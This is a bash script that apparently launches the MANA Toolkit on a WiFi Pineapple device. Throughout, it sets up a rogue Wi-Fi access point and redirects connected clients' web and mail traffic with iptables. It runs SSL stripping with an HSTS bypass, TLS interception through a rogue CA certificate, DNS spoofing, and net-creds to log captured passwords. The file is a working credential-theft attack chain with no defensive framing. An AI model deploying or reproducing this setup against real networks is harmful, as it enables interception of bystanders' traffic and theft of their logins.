#!/bin/bash
# This script is created by Andreas Nilsen / Zylla  - adde88@gmail.com - https://www.github.com/adde88
#
# It's meant to be a part of the MANA-Toolkit ported for the WiFi Pineapple NANO/TETRA.
# It therefore contains special functions for these devices, for example: locating the SD-card on the Pineapple NANO.
#
# It will probably work fine with other devices and versions of OpenWRT. If not, just contact me on GitHub, or the Hak5 Forums.
# Broadcom devices might be a problem
#
# License below:
# do What The Fuck you want to Public License

# Version 1.0, May 2017
# Copyright (C) 2017 Andreas Nilsen (]d).
# Takelvveien 408, 9321, Moen - Norway
# Everyone is permitted to copy and distribute verbatim copies
# of this license document, but changing it is not allowed.

# Ok, the purpose of this license is simple
# and you just
# DO WHAT THE FUCK YOU WANT TO.
#
#
# Need to setup some env. vars after fw 2.0.2
export PATH=$PATH:/sd/usr/bin:/sd/usr/sbin:/sd/bin:/sd/sbin
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/sd/lib:/sd/usr/lib
# setup some dirs needed to make it work with the Pineapple Module
mkdir -p /pineapple/modules/ManaToolkit/log/Net-Creds
mkdir -p /pineapple/modules/ManaToolkit/log/SSL-Split
mkdir -p /pineapple/modules/ManaToolkit/log/hostapd-mana
mkdir -p /pineapple/modules/ManaToolkit/log/SSLStrip+
# Some variables.
phy="$1"
nat_value="$2"
upstream="br-lan"
flag="1"
gw_ip="10.0.0.1"
subnet=`echo "$gw_ip"|cut -b1-7`
cidr="24"
MYTIME=`date +%s`
mana_output_file="/pineapple/modules/ManaToolkit/log/hostapd-mana_output.log"

sed -i 's/127.0.0.1/8.8.8.8/g' /etc/resolv.conf         			# This fixes a "strange" bug on the Pineapples. Without this: internet activity will not be found. Haven't debugged it yet. Therefore this dirty fix.

# Functions below.

function startup_message {
	echo -e "${RED}Mana Toolkit - ${GREEN}Pineapple Edition!\n${NC}"
}

function noupstream_check {
	noupstream="0"
	if [ "$nat_value" == "noupstream" ]; then
		noupstream="1"
	fi
}

function is_mana_running {
	mana_pid=`pgrep hostapd-mana`
	if [ "$mana_pid" == "" ];then
		echo -e "\n${RED}Exiting! (Error code: 4)\n${NC}hostapd-mana was not launched correctly."
		shutdown_mana
		exit 4
	else
		echo -e "\n${GREEN}hostapd-mana ${NC} is running with pid: ${mana_pid}"
	fi
}

function is_sslstrip_running {
	sslstrip_pid=`pgrep -f sslstrip2`
	if [ "$sslstrip_pid" == "" ];then
		echo -e "\n${RED}Exiting! (Error code: 5)\n${NC}SSLstrip+ was not launched correctly."
		shutdown_mana
		exit 5
	else
		echo -e "\n${GREEN}SSLstrip+ ${NC} is running with pid: ${sslstrip_pid}"
	fi
}

function is_sslsplit_running {
	sslsplit_pid=`pgrep -f sslsplit`
	if [ "$sslsplit_pid" == "" ];then
		echo -e "\n${RED}Exiting! (Error code: 6)\n${NC}SSLsplit was not launched correctly."
		shutdown_mana
		exit 6
	else
		echo -e "\n${GREEN}SSLsplit ${NC} is running with pid: ${sslsplit_pid}"
	fi
}

function is_dns2proxy_running {
	dns2proxy_pid=`pgrep -f dns2proxy`
	if [ "$dns2proxy_pid" == "" ];then
		echo -e "\n${RED}Exiting! (Error code: 7)\n${NC}DNS2Proxy was not launched correctly."
		shutdown_mana
		exit 7
	else
		echo -e "\n${GREEN}DNS2Proxy ${NC} is running with pid: ${dns2proxy_pid}"
	fi
}

function is_dnsmasq_running {
	dnsmasq_pid=`pgrep -f "/etc/mana-toolkit/dnsmasq-dhcpd.conf"`
	if [ "$noupstream" != 1 ];then
		if [ "$dnsmasq_pid" == "" ];then
			echo -e "\n${RED}Exiting! (Error code: 8)\n${NC}DHCP Server (dnsmasq) did not launch correctly."
			shutdown_mana
			exit 8
		else
			dnsmasq_pid=`pgrep -f "/etc/mana-toolkit/dnsmasq-dhcpd.conf"`
			echo -e "\n${GREEN}DHCP Server ${NC} is running with pid: ${dnsmasq_pid}"
		fi
	else
		echo -e "\n${RED}DHCP Server ${NC} check is skipped while running in noupstream mode."
	fi
}

function is_netcreds_running {
	netcreds_pid=`pgrep -f net-creds`
	if [ "$netcreds_pid" == "" ];then
		echo -e "\n${RED}Exiting! (Error code: 9)\n${NC}Net-Creds was not launched correctly."
		shutdown_mana
		exit 9
	else
		echo -e "\n${GREEN}Net-Creds ${NC} is running with pid: ${netcreds_pid}"
	fi
}

function safe_startup {
	mana_pid=`pgrep hostapd-mana`
	sslstrip_pid=`pgrep -f sslstrip2`
	sslsplit_pid=`pgrep -f sslsplit`
	dns2proxy_pid=`pgrep -f dns2proxy`
	dnsmasq_pid=`pgrep -f "/etc/mana-toolkit/dnsmasq-dhcpd.conf"`
	netcreds_pid=`pgrep -f net-creds`
	if [ "$dnsmasq_pid" != "" ];then
		kill -9 "$dnsmasq_pid" &>/dev/null
	fi
	if [ "$mana_pid" != "" ];then
		kill -9 "$mana_pid" &>/dev/null
	fi
	if [ "$sslstrip_pid" != "" ];then
		kill -9 "$sslstrip_pid" &>/dev/null
	fi
	if [ "$sslsplit_pid" != "" ];then
		kill -9 "$sslsplit_pid" &>/dev/null
	fi
	if [ "$dns2proxy_pid" != "" ];then
		kill -9 "$dns2proxy_pid" &>/dev/null
	fi
	if [ "$netcreds_pid" != "" ];then
		kill -9 "$netcreds_pid" &>/dev/null
	fi
}

function select_dev {
	if [ "$phy" == "" ]; then
		phy="wlan1"
	elif [ "$phy" == "wlan0" ]; then
		phy="wlan0"
	elif [ "$phy" == "wlan1" ]; then
		phy="wlan1"
	elif [ "$phy" == "wlan2" ]; then
		phy="wlan2"
	fi
	sed -i "s/^interface=.*$/interface="$phy"/" "$conf"
}

function check_sd {
	sd_card="0"
	if [ -e /sd ]; then
		sd_card="1"
	fi
	if [ "$sd_card" == "1" ]; then
		conf="/sd/etc/mana-toolkit/hostapd-mana.conf"
		dhcp_conf="/sd/etc/mana-toolkit/dnsmasq-dhcpd.conf"
		sslstrip_logfile="/pineapple/modules/ManaToolkit/log/SSLStrip+/sslstrip.log"
		sslsplit_logdir="/pineapple/modules/ManaToolkit/log/SSL-Split"
		ca_cert_pem="/sd/usr/share/mana-toolkit/cert/rogue-ca.pem"
		ca_key="/sd/usr/share/mana-toolkit/cert/rogue-ca.key"
		sslsplit_connect_log="/pineapple/modules/ManaToolkit/log/SSL-Split/sslsplit-connect.log"
		netcreds_log="/pineapple/modules/ManaToolkit/log/Net-Creds/net-creds.log"
		varlib="/sd/var/lib/mana-toolkit/"
		ssid_filter="/sd/etc/mana-toolkit/hostapd.ssid_filter"
	else
		conf="/etc/mana-toolkit/hostapd-mana.conf"
		dhcp_conf="/etc/mana-toolkit/dnsmasq-dhcpd.conf"
		sslstrip_logfile="/pineapple/modules/ManaToolkit/log/SSLStrip+/sslstrip.log"
		sslsplit_logdir="/pineapple/modules/ManaToolkit/log/SSL-Split"
		ca_cert_pem="/usr/share/mana-toolkit/cert/rogue-ca.pem"
		ca_key="/usr/share/mana-toolkit/cert/rogue-ca.key"
		sslsplit_connect_log="/pineapple/modules/ManaToolkit/log/SSL-Split/sslsplit-connect.log"
		netcreds_log="/pineapple/modules/ManaToolkit/log/Net-Creds/net-creds.log"
		varlib="/var/lib/mana-toolkit/"
		ssid_filter="/etc/mana-toolkit/hostapd.ssid_filter"
	fi
	mkdir -p "$varlib"
	
}

function check_interface {
	ifconfig "$phy" up &> /dev/null
	if [ ! -e /sys/class/net/"$phy" ]; then
		flag=0
		echo -e "${RED}Exiting! (Error code: 2)${NC}\nCannot find wireless interface: "$phy"\n"
		shutdown_mana
		exit 2
	fi
}

function check_cpu {
	CPU=`cat /proc/cpuinfo | grep -i machine | awk -F":" '{print $2}' | awk -F" " '{print $2}'`
	#echo -e "Current CPU: ${RED}"$CPU"${NC}."                                      # TO BE USED IN FUTURE UPDATE, MAYBE?
}

function flush_iptables {
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -F
	iptables -F -t nat

}

function masquerade_start {
	iptables -t nat -A POSTROUTING -o "$upstream" -j MASQUERADE
	iptables -A FORWARD -i "$phy" -o "$upstream" -j ACCEPT
	iptables -t nat -A PREROUTING -i "$phy" -p udp --dport 53 -j DNAT --to "$gw_ip"
}

function fking_rule {
	for table in $(ip rule list | awk -F"lookup" '{print $2}');
	do
	DEF=`ip route show table "$table"|grep default|grep "$upstream"`
	if ! [ -z "$DEF" ]; then
		break
	fi
	done
	ip route add "$subnet"1/"$cidr" dev "$phy" scope link table $table
}

function nat_forward {
	echo '1' > /proc/sys/net/ipv4/ip_forward
	ip addr flush dev "$phy"
	ip addr add "$gw_ip"/"$cidr" dev "$phy"
	ip link set "$phy" up
	ip route add default via "$gw_ip" dev "$phy"
}

function sslstrip_plus_start {
	{ sslstrip2 -l 10000 -a -w "$sslstrip_logfile" >/dev/null 2>&1 & }
	iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	{ dns2proxy -i "$phy" >/dev/null 2>&1 & }
}

function sslsplit_start {
	{ sslsplit -D -P -Z -S "$sslsplit_logdir" -c "$ca_cert_pem" -k "$ca_key" -O -l "$sslsplit_connect_log" \
	https 0.0.0.0 10443 \
	http 0.0.0.0 10080 \
	ssl 0.0.0.0 10993 \
	tcp 0.0.0.0 10143 \
	ssl 0.0.0.0 10995 \
	tcp 0.0.0.0 10110 \
	ssl 0.0.0.0 10465 \
	tcp 0.0.0.0 10025 >/dev/null 2>&1 & }
}

function sslsplit_iptables {
	#iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 80 -j REDIRECT --to-port 10080
	iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 25 -j REDIRECT --to-port 10025
	iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 110 -j REDIRECT --to-port 10110
	iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 143 -j REDIRECT --to-port 10143
	iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 443 -j REDIRECT --to-port 10443
	iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 465 -j REDIRECT --to-port 10465
	iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 993 -j REDIRECT --to-port 10993
	iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 995  -j REDIRECT --to-port 10995
	iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
}

function netcreds_start {
	{ net-creds -i "$phy" >> "$netcreds_log" >/dev/null 2>&1 & }
}

function shutdown_mana {
	safe_startup
	# Restore iptables
	iptables-restore < /tmp/rules.txt
	rm /tmp/rules.txt
	# Remove iface and route
	ip addr flush dev "$phy"
	ip link set "$phy" down
	ifconfig "phy" up
	ifconfig "$phy" up
	/etc/init.d/dnsmasq start
	echo -e "\n${RED}Mana Toolkit ${NC} has been shutdown."
}

function check_internet {
	noupstream_check
	if [ "$noupstream" != "1" ]; then
		if ping -c 1 google.com >> /dev/null 2>&1; then
			echo -e "Device seems to be: ${RED}ONLINE${NC}."
		else
			echo -e "${RED}Exiting! (Error code: 1)${NC}\nDevice seems to be: ${RED}OFFLINE${NC}."
			shutdown_mana
			exit 1
		fi
	else
		echo -e "${GREEN}NO-UPSTREAM MODE ENABLED${NC}."
	fi
}

function pause_while_working {
	printf "Press any key to kill Mana Toolkit properly : "
	(tty_state=$(stty -g)
	stty -icanon
	LC_ALL=C dd bs=1 count=1 >/dev/null 2>&1
	stty "$tty_state"
	) </dev/tty
}

function dnsmasq_setup {
	/etc/init.d/dnsmasq stop
	dnsmasq -z -C "$dhcp_conf" -i "$phy" -I lo
}

function hostapd-mana_start {
	hostapd-mana "$conf" | tee "$mana_output_file" &
}

function success_message {
	echo -e "\nMana Toolkit has started ${GREEN}successfully${NC} and is now running in the background.\nRun ${RED}kill-mana${NC} to stop Mana Toolkit."
	echo -e "\nLog files are stored at ${BLUE}/pineapple/modules/ManaToolkit/log/${NC}\nAnd can be downloaded using the module."
}

function startup {
	if [ "$flag" == "1" ];then
				check_internet                                                                  # Check for a working internet connection.
				nat_forward                                                                     # Setup interfaces and forward traffic
				hostapd-mana_start																# Start hostapd-mana
				dnsmasq_setup																	# Setup DHCP Server
				fking_rule                                                                      # Add fking rule to table 1006
				flush_iptables                                                                  # Flush
				masquerade_start                                                                # Masquerade
				sslstrip_plus_start                                                             # SSLStrip2 with HSTS bypass
				sslsplit_start                                                                  # SSLSplit
				sslsplit_iptables                                                               # Setup IPtables for SSLsplit
				netcreds_start                                                                  # Start net-creds
				sleep 5																			# Lets give it a few seconds to boot up.
				is_mana_running																	# Sanity-check for the hostapd-mana process.
				is_dnsmasq_running
				is_sslstrip_running
				is_dns2proxy_running
				is_sslsplit_running
				is_netcreds_running
				success_message																	# Display a success message, and fade into darkness.
				#pause_while_working															# This pauses the script, and waits for a user-input which will kill the script.
	fi
}

	startup_message						# All scripts need a startup-message.
	iptables-save > /tmp/rules.txt				# Save iptables
	check_sd        					# Tries to find out if any SD-cards are installed. If so, it changes directory variables to rather use the SD-card. ** Pineapple NANO/TETRA "Fix" **
	select_dev      					# Lets the user select another wireless device to be used. If none is selected: the default device will be used (wlan1)
	safe_startup    					# Kills any running processes that could interfere with MANA.
	check_interface    					# Check if the wireless device is up
	startup         					# Starts MANA-Toolkit core-functions.
	#shutdown_mana   					# Shuts down the MANA-Toolkit after user input
	exit 0          					# Exit gracefully
